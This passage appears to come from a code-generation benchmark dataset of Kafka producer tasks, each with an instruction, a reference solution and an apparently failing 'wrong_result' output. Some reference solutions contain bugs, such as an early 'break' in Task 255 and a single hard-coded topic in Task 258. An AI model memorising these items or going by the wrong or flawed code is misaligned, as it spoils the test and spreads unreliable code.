    "Canonical_solution": "import csv\nimport json\nimport time\nfrom kafka import KafkaProducer\n\ndef kafka_producer():\n    topic = \"ratings\"\n    time.sleep(30)\n    producer = KafkaProducer(\n        bootstrap_servers=[\"kafka:9092\"],\n        security_protocol=\"PLAINTEXT\",\n        api_version=(0, 10, 2),\n    )\n\n    with open(\"./dataset.csv\", newline=\"\") as csvfile:\n        dataset_reader = csv.reader(csvfile, delimiter=\",\")\n        first_line = True\n        for row in dataset_reader:\n            if first_line:\n                first_line = False\n                continue\n            message_json = {\n                \"userId\": int(row[0]),\n                \"movieId\": int(row[1]),\n                \"rating\": float(row[2]),\n                \"timestamp\": int(row[3]),\n            }\n            producer.send(topic, (json.dumps(message_json)).encode(\"utf-8\"))\n            time.sleep(0.1)\n\n    producer.send(topic, \"*COMMIT*\".encode(\"utf-8\"))\n    time.sleep(2)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "wrong_result": "```python\nimport time\nimport json\nimport csv\nfrom confluent_kafka import Producer\n\ndef deliver_report(err, msg):\n    if err:\n        print(f'Message delivery failed: {err}')\n    else:\n        print(f'Message delivered to {msg.topic()} [{msg.partition()}]')\n\ndef send_csv_to_kafka():\n    time.sleep(30)\n    \n    conf = {\n        'bootstrap.servers': 'kafka:9092',\n        'client.id': 'csv-producer'\n    }\n\n    producer = Producer(conf)\n    topic = 'movie_ratings'\n\n    with open('./dataset.csv', 'r') as csvfile:\n        reader = csv.DictReader(csvfile)\n        for row in reader:\n            try:\n                json_row = json.dumps(row)\n                producer.produce(topic, key=row['movie_id'], value=json_row, callback=deliver_report)\n                producer.poll(1)\n                time.sleep(0.1)\n            except Exception as e:\n                print(f'Error processing row: {e}')\n\n    producer.produce(topic, key='*COMMIT*', value='{\"status\": \"completed\"}', callback=deliver_report)\n    producer.poll(1)\n    producer.flush()\n```"
  },
  {
    "Task_id": 255,
    "Instruction": "Task Description: Implement a function that sends messages to a Kafka topic, ensuring the topic exists before sending messages and properly managing resources.\n\nFunction Description: The function `kafka_producer` sends messages from a file to a specified Kafka topic. It first checks if the topic exists and creates it if necessary. Then, it reads lines from the input file, encodes them, and sends them to the Kafka topic using a producer instance. The function includes logging for progress tracking and ensures proper cleanup by closing the producer and admin client.\n\nInput:  \n- `servers`: [str] - Comma-separated list of Kafka bootstrap servers.  \n- `topic`: [str] - The name of the Kafka topic to which messages will be sent.  \n- `input_path`: [str] - The path to the input file containing messages to be sent.  \n- `timeout`: [int] - The timeout in seconds for the Kafka producer request.  \n\nOutput:  \n- None: The function does not return any value but sends messages to the specified Kafka topic and logs progress.",
    "Canonical_solution": "import argparse\nimport logging\nimport sys\nfrom kafka import KafkaAdminClient\nfrom kafka import KafkaProducer\nfrom kafka.admin import NewTopic\n\ndef kafka_producer(servers, topic, input_path, timeout):\n    admin_clt = KafkaAdminClient(bootstrap_servers=servers)\n    if topic not in admin_clt.list_topics():\n        admin_clt.create_topics(\n            new_topics=[\n                NewTopic(\n                    name=topic,\n                    num_partitions=1,\n                    replication_factor=1,\n                    topic_configs={'max.message.bytes': 1024 * 1024 * 1024})\n            ],\n            validate_only=False)\n        logging.info('create increment save topic: %s' % topic)\n    admin_clt.close()\n\n    producer = KafkaProducer(\n        bootstrap_servers=servers,\n        request_timeout_ms=timeout * 1000,\n        api_version=(0, 10, 1))\n\n    i = 1\n    with open(input_path, 'r') as fin:\n        for line_str in fin:\n            producer.send(topic, line_str.encode('utf-8'))\n            i += 1\n            break\n            if i % 100 == 0:\n                logging.info('progress: %d' % i)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "wrong_result": "```python\nimport logging\nfrom confluent_kafka import Producer, KafkaException, admin, Consumer\n\ndef kafka_producer(servers, topic, input_path, timeout):\n    logging.basicConfig(level=logging.INFO)\n\n    conf = {\n        'bootstrap.servers': servers,\n        'message.timeout.ms': timeout * 1000\n    }\n\n    admin_conf = {'bootstrap.servers': servers}\n\n    admin_client = admin.AdminClient(admin_conf)\n    producer = Producer(conf)\n\n    try:\n        metadata = admin_client.list_topics(timeout=timeout)\n        if topic not in metadata.topics:\n            new_topics = [admin.NewTopic(topic, num_partitions=1, replication_factor=1)]\n            fs = admin_client.create_topics(new_topics, validate_only=False)\n            for t, f in fs.items():\n                try:\n                    f.result()\n                    logging.info(f\"Created topic {t}\")\n                except Exception as e:\n                    logging.error(f\"Failed to create topic {t}: {e}\")\n\n        with open(input_path, 'r') as file:\n            for line in file:\n                line = line.strip()\n                if line:\n                    producer.produce(topic, key=None, value=line.encode('utf-8'))\n                    producer.poll(0)\n                    logging.info(f\"Sent message: {line}\")\n\n        producer.flush(timeout=timeout)\n    except KafkaException as ke:\n        logging.error(f\"Kafka error: {ke.args[0].str()}\")\n    except Exception as e:\n        logging.error(f\"Error: {e}\")\n    finally:\n        producer.close()\n        admin_client.close()\n```"
  },
  {
    "Task_id": 258,
    "Instruction": "Task Description: Create a function that generates and sends timestamped messages to Kafka topics with different timezone configurations.\n\nFunction Description: The function generates a stream of messages containing timestamps in two different timezones (America/New_York and Europe/Paris) and sends them randomly to two Kafka topics. Each message includes a timestamp in its respective timezone and a sequential message number. The function handles Kafka producer initialization, message generation, sending, and proper resource cleanup.\n\nInput: \n- None (The function uses internal constants for configuration)\n\nOutput: \n- None (The function's effect is sending messages to Kafka topics)\n\nNote: The function uses the following internal configurations:\n- input_size: int = 100 (number of messages to generate)\n- topic1: str = \"timezone1\" (first Kafka topic)\n- topic2: str = \"timezone2\" (second Kafka topic)\n- timezone1: ZoneInfo = ZoneInfo(\"America/New_York\")\n- timezone2: ZoneInfo = ZoneInfo(\"Europe/Paris\")\n- str_repr: str = \"%Y-%m-%d %H:%M:%S.%f %z\" (timestamp format)\n- api_version: tuple = (0, 10, 2) (Kafka API version)\n- bootstrap_servers: list = [\"kafka:9092\"] (Kafka server address)\n- security_protocol: str = \"PLAINTEXT\" (connection protocol)",
    "Canonical_solution": "import json\nimport random\nimport time\nfrom datetime import datetime\nfrom zoneinfo import ZoneInfo\nfrom kafka import KafkaProducer\n\ndef generate_stream():\n    input_size = 100\n    random.seed(0)\n    topic1 = \"timezone1\"\n    topic2 = \"timezone2\"\n    timezone1 = ZoneInfo(\"America/New_York\")\n    timezone2 = ZoneInfo(\"Europe/Paris\")\n    str_repr = \"%Y-%m-%d %H:%M:%S.%f %z\"\n    api_version = (0, 10, 2)\n\n    time.sleep(30)\n    producer1 = KafkaProducer(\n        bootstrap_servers=[\"kafka:9092\"],\n        security_protocol=\"PLAINTEXT\",\n        api_version=api_version,\n    )\n    producer2 = KafkaProducer(\n        bootstrap_servers=[\"kafka:9092\"],\n        security_protocol=\"PLAINTEXT\",\n        api_version=api_version,\n    )\n\n    def send_message(timezone: ZoneInfo, producer: KafkaProducer, i: int):\n        timestamp = datetime.now(timezone)\n        message_json = {\"date\": timestamp.strftime(str_repr), \"message\": str(i)}\n        producer.send(topic1, (json.dumps(message_json)).encode(\"utf-8\"))\n\n    for i in range(input_size):\n        if random.choice([True, False]):\n            send_message(timezone1, producer1, i)\n        else:\n            send_message(timezone2, producer2, i)\n        time.sleep(1)\n\n    time.sleep(2)\n    producer1.close()\n    producer2.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "wrong_result": "```python\nfrom confluent_kafka import Producer\nfrom zoneinfo import ZoneInfo\nfrom datetime import datetime, timedelta\nimport random\nimport json\n\ndef delivery_report(err, msg):\n    if err:\n        print(f'Message delivery failed: {err}')\n    else:\n        print(f'Message delivered to {msg.topic()} [{msg.partition()}]')\n\ndef send_timezone_messages():\n    input_size = 100\n    topic1 = \"timezone1\"\n    topic2 = \"timezone2\"\n    timezone1 = ZoneInfo(\"America/New_York\")\n    timezone2 = ZoneInfo(\"Europe/Paris\")\n    str_repr = \"%Y-%m-%d %H:%M:%S.%f %z\"\n    api_version = (0, 10, 2)\n    bootstrap_servers = [\"kafka:9092\"]\n    security_protocol = \"PLAINTEXT\"\n\n    conf = {\n        'bootstrap.servers': ','.join(bootstrap_servers),\n        'api.version.request': True,\n        'api.version': f'{api_version[0]}.{api_version[1]}.{api_version[2]}',\n        'security.protocol': security_protocol\n    }\n\n    producer = Producer(conf)\n\n    for i in range(input_size):\n        base_time = datetime.now(timezone1) + timedelta(seconds=i)\n        ny_time = base_time.astimezone(timezone1).strftime(str_repr)\n        paris_time = base_time.astimezone(timezone2).strftime(str_repr)\n\n        message = {\n            'message_number': i,\n            'new_york_time': ny_time,\n            'paris_time': paris_time\n        }\n\n        topic = topic1 if random.choice([True, False]) else topic2\n        producer.produce(topic, key=str(i), value=json.dumps(message), callback=delivery_report)\n        producer.poll(0)\n\n    producer.flush()\n```"
  },
  {
    "Task_id": 259,
    "Instruction": "Task Description: Implement a KafkaProducer class in Python that can send messages to a Kafka cluster with configurable settings for serialization, partitioning, compression, and message delivery guarantees.\n\nClass Description: The KafkaProducer class is a high-level producer client that publishes messages to Kafka topics. It handles message serialization, partitioning, batching, and retries for failed requests. The producer is thread-safe and manages background threads for message accumulation and network I/O.\n\nAttributes:\n- config: [dict] - Configuration parameters for the producer including bootstrap servers, serializers, acks, etc.\n- _metrics: [Metrics] - Tracks producer performance metrics\n- _accumulator: [RecordAccumulator] - Batches messages by topic-partition before sending\n- _metadata: [ClusterMetadata] - Maintains cluster metadata including topic partitions\n- _sender: [Sender] - Background thread that sends batched messages to brokers\n- _closed: [bool] - Flag indicating if producer has been closed\n- _cleanup: [function] - Cleanup handler registered with atexit\n\nMethods:\n- __init__(**configs) -> None - Initializes the producer with given configuration overrides\n- send(topic, value=None, key=None, headers=None, partition=None, timestamp_ms=None) -> FutureRecordMetadata - Asynchronously sends a message to the specified topic and returns a future\n- flush(timeout=None) -> None - Ensures all buffered messages are delivered within timeout\n- close(timeout=None) -> None - Closes the producer and releases resources\n- _cleanup_factory() -> function - Creates cleanup function for atexit registration\n- _unregister_cleanup() -> None - Removes cleanup handler from atexit\n- _max_usable_produce_magic() -> int - Determines message format version based on API version\n- _estimate_size_in_bytes(key, value, headers=[]) -> int - Estimates serialized message size\n- _ensure_valid_record_size(size) -> None - Validates message size against configured limits\n- _wait_on_metadata(topic, max_wait) -> set - Waits for metadata update for given topic\n- _serialize(f, topic, data) -> bytes - Serializes message key/value using configured serializer\n- _partition(topic, partition, key, value, serialized_key, serialized_value) -> int - Determines target partition for message",
    "Canonical_solution": "import atexit\nimport copy\nimport logging\nimport socket\nimport threading\nimport time\nimport weakref\n\nfrom kafka.vendor import six\nimport kafka.errors as Errors\nfrom kafka.client_async import KafkaClient, selectors\nfrom kafka.codec import has_gzip, has_snappy, has_lz4, has_zstd\nfrom kafka.metrics import MetricConfig, Metrics\nfrom kafka.partitioner.default import DefaultPartitioner\nfrom kafka.producer.future import FutureRecordMetadata, FutureProduceResult\nfrom kafka.producer.record_accumulator import AtomicInteger, RecordAccumulator\nfrom kafka.producer.sender import Sender\nfrom kafka.record.default_records import DefaultRecordBatchBuilder\nfrom kafka.record.legacy_records import LegacyRecordBatchBuilder\nfrom kafka.serializer import Serializer\nfrom kafka.structs import TopicPartition\n\nlog = logging.getLogger(__name__)\nPRODUCER_CLIENT_ID_SEQUENCE = AtomicInteger()\n\nclass KafkaProducer:\n    DEFAULT_CONFIG = {\n        'bootstrap_servers': 'localhost',\n        'client_id': None,\n        'key_serializer': None,\n        'value_serializer': None,\n        'acks': 1,\n        'bootstrap_topics_filter': set(),\n        'compression_type': None,\n        'retries': 0,\n        'batch_size': 16384,\n        'linger_ms': 0,\n        'partitioner': DefaultPartitioner(),\n        'buffer_memory': 33554432,\n        'connections_max_idle_ms': 9 * 60 * 1000,\n        'max_block_ms': 60000,\n        'max_request_size': 1048576,\n        'metadata_max_age_ms': 300000,\n        'retry_backoff_ms': 100,\n        'request_timeout_ms': 30000,\n        'receive_buffer_bytes': None,\n        'send_buffer_bytes': None,\n        'socket_options': [(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)],\n        'sock_chunk_bytes': 4096,\n        'sock_chunk_buffer_count': 1000,\n        'reconnect_backoff_ms': 50,\n        'reconnect_backoff_max_ms': 1000,\n        'max_in_flight_requests_per_connection': 5,\n        'security_protocol': 'PLAINTEXT',\n        'ssl_context': None,\n        'ssl_check_hostname': True,\n        'ssl_cafile': None,\n        'ssl_certfile': None,\n        'ssl_keyfile': None,\n        'ssl_crlfile': None,\n        'ssl_password': None,\n        'ssl_ciphers': None,\n        'api_version': None,\n        'api_version_auto_timeout_ms': 2000,\n        'metric_reporters': [],\n        'metrics_num_samples': 2,\n        'metrics_sample_window_ms': 30000,\n        'selector': selectors.DefaultSelector,\n        'sasl_mechanism': None,\n        'sasl_plain_username': None,\n        'sasl_plain_password': None,\n        'sasl_kerberos_service_name': 'kafka',\n        'sasl_kerberos_domain_name': None,\n        'sasl_oauth_token_provider': None,\n        'kafka_client': KafkaClient,\n    }\n\n    _COMPRESSORS = {\n        'gzip': (has_gzip, LegacyRecordBatchBuilder.CODEC_GZIP),\n        'snappy': (has_snappy, LegacyRecordBatchBuilder.CODEC_SNAPPY),\n        'lz4': (has_lz4, LegacyRecordBatchBuilder.CODEC_LZ4),\n        'zstd': (has_zstd, DefaultRecordBatchBuilder.CODEC_ZSTD),\n        None: (lambda: True, LegacyRecordBatchBuilder.CODEC_NONE),\n    }\n\n    def __init__(self, **configs):\n        self.config = copy.copy(self.DEFAULT_CONFIG)\n        for key in self.config:\n            if key in configs:\n                self.config[key] = configs.pop(key)\n\n        if self.config['client_id'] is None:\n            self.config['client_id'] = 'kafka-python-producer-%s' % (PRODUCER_CLIENT_ID_SEQUENCE.increment(),)\n\n        if self.config['acks'] == 'all':\n            self.config['acks'] = -1\n\n        metrics_tags = {'client-id': self.config['client_id']}\n        metric_config = MetricConfig(samples=self.config['metrics_num_samples'],\n                                   time_window_ms=self.config['metrics_sample_window_ms'],\n                                   tags=metrics_tags)\n        reporters = [reporter() for reporter in self.config['metric_reporters']]\n        self._metrics = Metrics(metric_config, reporters)\n\n        client = self.config['kafka_client'](\n            metrics=self._metrics, metric_group_prefix='producer',\n            wakeup_timeout_ms=self.config['max_block_ms'],\n            **self.config)\n\n        if self.config['api_version'] is None:\n            self.config['api_version'] = client.config['api_version']\n\n        ct = self.config['compression_type']\n        if ct not in self._COMPRESSORS:\n            raise ValueError(\"Not supported codec: {}\".format(ct))\n        else:\n            checker, compression_attrs = self._COMPRESSORS[ct]\n            assert checker(), \"Libraries for {} compression codec not found\".format(ct)\n            self.config['compression_attrs'] = compression_attrs\n\n        message_version = self._max_usable_produce_magic()\n        self._accumulator = RecordAccumulator(message_version=message_version, metrics=self._metrics, **self.config)\n        self._metadata = client.cluster\n        guarantee_message_order = bool(self.config['max_in_flight_requests_per_connection'] == 1)\n        self._sender = Sender(client, self._metadata,\n                             self._accumulator, self._metrics,\n                             guarantee_message_order=guarantee_message_order,\n                             **self.config)\n        self._sender.daemon = True\n        self._sender.start()\n        self._closed = False\n\n        self._cleanup = self._cleanup_factory()\n        atexit.register(self._cleanup)\n\n    def send(self, topic, value=None, key=None, headers=None, partition=None, timestamp_ms=None):\n        assert value is not None or self.config['api_version'] >= (0, 8, 1), (\n            'Null messages require kafka >= 0.8.1')\n        assert not (value is None and key is None), 'Need at least one: key or value'\n        key_bytes = value_bytes = None\n        try:\n            self._wait_on_metadata(topic, self.config['max_block_ms'] / 1000.0)\n\n            key_bytes = self._serialize(\n                self.config['key_serializer'],\n                topic, key)\n            value_bytes = self._serialize(\n                self.config['value_serializer'],\n                topic, value)\n            assert type(key_bytes) in (bytes, bytearray, memoryview, type(None))\n            assert type(value_bytes) in (bytes, bytearray, memoryview, type(None))\n\n            partition = self._partition(topic, partition, key, value,\n                                      key_bytes, value_bytes)\n\n            if headers is None:\n                headers = []\n            assert type(headers) == list\n            assert all(type(item) == tuple and len(item) == 2 and type(item[0]) == str and type(item[1]) == bytes for item in headers)\n\n            message_size = self._estimate_size_in_bytes(key_bytes, value_bytes, headers)\n            self._ensure_valid_record_size(message_size)\n\n            tp = TopicPartition(topic, partition)\n            result = self._accumulator.append(tp, timestamp_ms,\n                                             key_bytes, value_bytes, headers,\n                                             self.config['max_block_ms'],\n                                             estimated_size=message_size)\n            future, batch_is_full, new_batch_created = result\n            if batch_is_full or new_batch_created:\n                self._sender.wakeup()\n\n            return future\n        except Errors.BrokerResponseError as e:\n            return FutureRecordMetadata(\n                FutureProduceResult(TopicPartition(topic, partition)),\n                -1, None, None,\n                len(key_bytes) if key_bytes is not None else -1,\n                len(value_bytes) if value_bytes is not None else -1,\n                sum(len(h_key.encode(\"utf-8\")) + len(h_value) for h_key, h_value in headers) if headers else -1,\n            ).failure(e)\n\n    def flush(self, timeout=None):\n        self._accumulator.begin_flush()\n        self._sender.wakeup()\n        self._accumulator.await_flush_completion(timeout=timeout)\n\n    def close(self, timeout=None):\n        self._unregister_cleanup()\n\n        if not hasattr(self, '_closed') or self._closed:\n            return\n\n        invoked_from_callback = bool(threading.current_thread() is self._sender)\n        if timeout > 0:\n            if invoked_from_callback:\n                pass\n            else:\n                if self._sender is not None:\n                    self._sender.initiate_close()\n                    self._sender.join(timeout)\n\n        if self._sender is not None and self._sender.is_alive():\n            self._sender.force_close()\n\n        self._metrics.close()\n        try:\n            self.config['key_serializer'].close()\n        except AttributeError:\n            pass\n        try:\n            self.config['value_serializer'].close()\n        except AttributeError:\n            pass\n        self._closed = True\n\n    def _cleanup_factory(self):\n        _self = weakref.proxy(self)\n        def wrapper():\n            try:\n                _self.close(timeout=0)\n            except (ReferenceError, AttributeError):\n                pass\n        return wrapper\n\n    def _unregister_cleanup(self):\n        if getattr(self, '_cleanup', None):\n            if hasattr(atexit, 'unregister'):\n                atexit.unregister(self._cleanup)\n            else:\n                try:\n                    atexit._exithandlers.remove((self._cleanup, (), {}))\n                except ValueError:\n                    pass\n        self._cleanup = None\n\n    def _max_usable_produce_magic(self):\n        if self.config['api_version'] >= (0, 11):\n            return 2\n        elif self.config['api_version'] >= (0, 10):\n            return 1\n        else:\n            return 0\n\n    def _estimate_size_in_bytes(self, key, value, headers=[]):\n        magic = self._max_usable_produce_magic()\n        if magic == 2:\n            return DefaultRecordBatchBuilder.estimate_size_in_bytes(key, value, headers)\n        else:\n            return LegacyRecordBatchBuilder.estimate_size_in_bytes(magic, self.config['compression_type'], key, value)\n\n    def _ensure_valid_record_size(self, size):\n        if size > self.config['max_request_size']:\n            raise Errors.MessageSizeTooLargeError(\n                \"The message is %d bytes when serialized which is larger than\"\n                \" the maximum request size you have configured with the\"\n                \" max_request_size configuration\" % (size,))\n        if size > self.config['buffer_memory']:\n            raise Errors.MessageSizeTooLargeError(\n                \"The message is %d bytes when serialized which is larger than\"\n                \" the total memory buffer you have configured with the\"\n                \" buffer_memory configuration.\" % (size,))\n\n    def _wait_on_metadata(self, topic, max_wait):\n        self._sender.add_topic(topic)\n        begin = time.time()\n        elapsed = 0.0\n        metadata_event = None\n        while True:\n            partitions = self._metadata.partitions_for_topic(topic)\n            if partitions is not None:\n                return partitions\n\n            if not metadata_event:\n                metadata_event = threading.Event()\n\n            metadata_event.clear()\n            future = self._metadata.request_update()\n            future.add_both(lambda e, *args: e.set(), metadata_event)\n            self._sender.wakeup()\n            metadata_event.wait(max_wait - elapsed)\n            elapsed = time.time() - begin\n            if not metadata_event.is_set():\n                raise Errors.KafkaTimeoutError(\n                    \"Failed to update metadata after %.1f secs.\" % (max_wait,))\n            elif topic in self._metadata.unauthorized_topics:\n                raise Errors.TopicAuthorizationFailedError(topic)\n\n    def _serialize(self, f, topic, data):\n        if not f:\n            return data\n        if isinstance(f, Serializer):\n            return f.serialize(topic, data)\n        return f(data)\n\n    def _partition(self, topic, partition, key, value, serialized_key, serialized_value):\n        if partition is not None:\n            assert partition >= 0\n            assert partition in self._metadata.partitions_for_topic(topic), 'Unrecognized partition'\n            return partition\n\n        all_partitions = sorted(self._metadata.partitions_for_topic(topic))\n        available = list(self._metadata.available_partitions_for_topic(topic))\n        return self.config['partitioner'](serialized_key, all_partitions, available)",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "wrong_result": "```python\nimport threading\nimport atexit\nfrom time import time, sleep\nfrom collections import defaultdict\nfrom queue import Queue\nfrom abc import ABC, abstractmethod\nfrom typing import Any, Dict, Optional, List, Tuple, Set, Callable, Union\n\nclass FutureRecordMetadata:\n    def __init__(self):\n        self._result = None\n        self._exception = None\n        self._callbacks = []\n        self._callbacks_lock = threading.Lock()\n        self._done_event = threading.Event()\n\n    def set_result(self, result):\n        with self._callbacks_lock:\n            self._result = result\n            for callback in self._callbacks:\n                callback(result)\n            self._done_event.set()\n\n    def set_exception(self, exception):\n        with self._callbacks_lock:\n            self._exception = exception\n            for callback in self._callbacks:\n                callback(exception)\n            self._done_event.set()\n\n    def add_callback(self, callback):\n        with self._callbacks_lock:\n            if self._done_event.is_set():\n                callback(self._result if self._result is not None else self._exception)\n            else:\n                self._callbacks.append(callback)\n\n    def get(self, timeout=None):\n        if not self._done_event.wait(timeout):\n            raise TimeoutError(\"Future did not complete within the timeout\")\n        if self._exception:\n            raise self._exception\n        return self._result\n\nclass Serializer(ABC):\n    @abstractmethod\n    def serialize(self, topic: str, data: Any) -> bytes:\n        pass\n\nclass StringSerializer(Serializer):\n    def serialize(self, topic: str, data: Any) -> bytes:\n        return str(data).encode('utf-8') if data is not None else b''\n\nclass ClusterMetadata:\n    def __init__(self):\n        self.topics = {}\n\n    def update(self, topic: str, partitions: int):\n        self.topics[topic] = {'partitions': partitions}\n\nclass Metrics:\n    def __init__(self):\n        self.metrics = {}\n\n    def record(self, name: str, value: float):\n        if name not in self.metrics:\n            self.metrics[name] = []\n        self.metrics[name].append(value)\n\nclass RecordAccumulator:\n    def __init__(self, batch_size: int):\n        self.queues = defaultdict(Queue)\n        self.batch_size = batch_size\n        self.lock = threading.Lock()\n\n    def append(self, tp: Tuple[str, int], record: 'ProducerRecord'):\n        with self.lock:\n            self.queues[tp].put(record)\n\n    def drain(self) -> List[Tuple[Tuple[str, int], List['ProducerRecord']]]:\n        with self.lock:\n            drained = []\n            for tp, q in self.queues.items():\n                batch = []\n                while not q.empty() and sum(r.size for r in batch + [q.queue[0]]) <= self.batch_size:\n                    batch.append(q.get())\n                if batch:\n                    drained.append((tp, batch))\n            return drained\n\nclass Sender:\n    def __init__(self, accumulator: RecordAccumulator, producer_id: int, config: Dict):\n        self.accumulator = accumulator\n        self.producer_id = producer_id\n        self.config = config\n        self.running = True\n        self.thread = threading.Thread(target=self.run)\n\n    def start(self):\n        self.thread.start()\n\n    def run(self):\n        while self.running:\n            batches = self.accumulator.drain()\n            for (topic, partition), records in batches:\n                self.send_batch(topic, partition, records)\n\n    def send_batch(self, topic: str, partition: int, records: List['ProducerRecord']):\n        try:\n            # Simulate network I/O\n            sleep(0.01)\n            for record in records:\n                record.future.set_result({'topic': topic, 'partition': partition, 'offset': 42})\n        except Exception as e:\n            for record in records:\n                record.future.set_exception(e)\n\n    def stop(self):\n        self.running = False\n        self.thread.join()\n\nclass KafkaProducer:\n    def __init__(self, **configs):\n        self.config = {\n            'bootstrap_servers': 'localhost:9092',\n            'key_serializer': StringSerializer(),\n            'value_serializer': StringSerializer(),\n            'acks': 'all',\n            'retries': 3,\n            'batch_size': 16384,\n            'linger_ms': 10,\n            'buffer_memory': 33554432,\n            'compression_type': 'none',\n            'max_block_ms': 60000,\n            'request_timeout_ms': 30000,\n            'enable_idempotence': False,\n            'transactional_id': None,\n            'metadata_max_age_ms': 300000,\n            'metrics_recording_level': 'INFO',\n            'metric_reporters': [],\n            **configs\n        }\n\n        self._metrics = Metrics()\n        self._accumulator = RecordAccumulator(self.config['batch_size'])\n        self._metadata = ClusterMetadata()\n        self._sender = Sender(self._accumulator, producer_id=0, config=self.config)\n        self._closed = False\n        self._cleanup = self._cleanup_factory()\n        atexit.register(self._cleanup)\n        self._sender.start()\n\n    def _cleanup_factory(self):\n        def cleanup_func():\n            self.close()\n        return cleanup_func\n\n    def _unregister_cleanup(self):\n        atexit.unregister(self._cleanup)\n\n    def _max_usable_produce_magic(self) -> int:\n        return 2\n\n    def _estimate_size_in_bytes(self, key: Any, value: Any, headers: List[Tuple[str, bytes]] = []) -> int:\n        key_size = len(self.config['key_serializer'].serialize('', key)) if key is not None else 0\n        value_size = len(self.config['value_serializer'].serialize('', value)) if value is not None else 0\n        header_size = sum(len(k) + len(v) for k, v in headers)\n        return key_size + value_size + header_size + 20  # Approximate overhead\n\n    def _ensure_valid_record_size(self, size: int):\n        max_request_size = self.config.get('max_request_size', 1048576)\n        if size > max_request_size:\n            raise ValueError(f\"Message size {size} exceeds maximum allowed size of {max_request_size}\")\n\n    def _wait_on_metadata(self, topic: str, max_wait: int) -> Set[int]:\n        if topic not in self._metadata.topics:\n            self._metadata.update(topic, 4)  # Simulated metadata update\n        return set(range(self._metadata.topics[topic]['partitions']))\n\n    def _serialize(self, f: Callable, topic: str, data: Any) -> bytes:\n        return f.serialize(topic, data)\n\n    def _partition(self, topic: str, partition: Optional[int], key: Any, value: Any, serialized_key: bytes, serialized_value: bytes) -> int:\n        if partition is not None:\n            return partition\n        if key is not None:\n            hash_val = hash(serialized_key)\n        else:\n            hash_val = hash(serialized_value)\n        num_partitions = self._metadata.topics[topic]['partitions']\n        return hash_val % num_partitions\n\n    def send(self, topic: str, value: Any = None, key: Any = None, headers: List[Tuple[str, bytes]] = None, partition: Optional[int] = None, timestamp_ms: Optional[float] = None) -> FutureRecordMetadata:\n        future = FutureRecordMetadata()\n        record = ProducerRecord(\n            topic=topic,\n            key=key,\n            value=value,\n            headers=headers or [],\n            partition=partition,\n            timestamp_ms=timestamp_ms,\n            future=future\n        )\n        self._process_record(record)\n        return future\n\n    def flush(self, timeout: Optional[float] = None):\n        start_time = time()\n        while not self._is_flushed():\n            elapsed = time() - start_time\n            if timeout is not None and elapsed >= timeout:\n                raise TimeoutError(\"Flush timed out\")\n            sleep(0.01)\n\n    def close(self, timeout: Optional[float] = None):\n        self._closed = True\n        self._unregister_cleanup()\n        self._sender.stop()\n        start_time = time()\n        while self._sender.thread.is_alive():\n            if timeout is not None and time() - start_time >= timeout:\n                self._sender.thread.join(timeout)\n                break\n            self._sender.thread.join(0.1)\n\n    def _is_flushed(self) -> bool:\n        return all(q.empty() for q in self._accumulator.queues.values())\n\n    def _process_record(self, record: 'ProducerRecord'):\n        try:\n            serialized_key = self._serialize(self.config['key_serializer'], record.topic, record.key)\n            serialized_value = self._serialize(self.config['value_serializer'], record.topic, record.value)\n            record.size = self._estimate_size_in_bytes(record.key, record.value, record.headers)\n            self._ensure_valid_record_size(record.size)\n            available_partitions = self._wait_on_metadata(record.topic, max_wait=30000)\n            target_partition = self._partition(record.topic, record.partition, record.key, record.value, serialized_key, serialized_value)\n            if target_partition not in available_partitions:\n                raise ValueError(f\"Partition {target_partition} is not available for topic {record.topic}\")\n            self._accumulator.append((record.topic, target_partition), record)\n        except Exception as e:\n            record.future.set_exception(e)\n\nclass ProducerRecord:\n    def __init__(self, topic: str, key: Any, value: Any, headers: List[Tuple[str, bytes]], partition: Optional[int], timestamp_ms: Optional[float], future: FutureRecordMetadata):\n        self.topic = topic\n        self.key = key\n        self.value = value\n        self.headers = headers\n        self.partition = partition\n        self.timestamp_ms = timestamp_ms\n        self.future = future\n        self.size = 0\n```"
  },
  {
    "Task_id": 261,
    "Instruction": "Task Description: Implement a Kafka producer function that reads data from a CSV file and sends it as JSON messages to a specified Kafka topic, with special commit markers before and after the data transmission.\n\nFunction Description: The function establishes a connection to a Kafka broker, reads movie rating data from a CSV file, converts each record to JSON format, and sends them to a predefined Kafka topic. It sends a \"*COMMIT*\" marker before and after the data transmission to indicate the start and end of the dataset. The function includes delays to ensure proper message delivery and resource cleanup.\n\nInput: None (The function uses hardcoded values for the Kafka broker configuration and file path)\n\nOutput: None (The function's effect is the messages sent to the Kafka topic)",
    "Canonical_solution": "import csv\nimport json\nimport time\nfrom kafka import KafkaProducer\n\ndef kafka_producer():\n    topic = \"ratings\"\n    time.sleep(30)\n    producer = KafkaProducer(\n        bootstrap_servers=[\"redpanda:9092\"],\n        security_protocol=\"PLAINTEXT\",\n        api_version=(0, 10, 2),\n    )\n    producer.send(topic, \"*COMMIT*\".encode(\"utf-8\"))\n    time.sleep(2)\n\n    with open(\"./dataset.csv\", newline=\"\") as csvfile:\n        dataset_reader = csv.reader(csvfile, delimiter=\",\")\n        first_line = True\n        for row in dataset_reader:\n            if first_line:\n                first_line = False\n                continue\n            message_json = {\n                \"userId\": int(row[0]),\n                \"movieId\": int(row[1]),\n                \"rating\": float(row[2]),\n                \"timestamp\": int(row[3]),\n            }\n            producer.send(topic, (json.dumps(message_json)).encode(\"utf-8\"))\n            time.sleep(0.1)\n\n    producer.send(topic, \"*COMMIT*\".encode(\"utf-8\"))\n    time.sleep(2)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
